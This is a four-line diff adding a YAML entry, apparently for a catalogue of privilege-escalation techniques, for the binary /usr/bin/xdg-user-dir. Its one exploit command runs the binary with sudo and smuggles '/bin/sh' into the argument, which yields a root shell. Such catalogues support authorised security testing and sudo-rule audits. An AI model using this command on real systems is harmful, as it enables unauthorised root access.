@@ -1,0 +1,4 @@
+name: xdg-user-dir
+binary_path: /usr/bin/xdg-user-dir
+exploit_cmds:
+- 'sudo /usr/bin/xdg-user-dir ''}; /bin/sh #'''
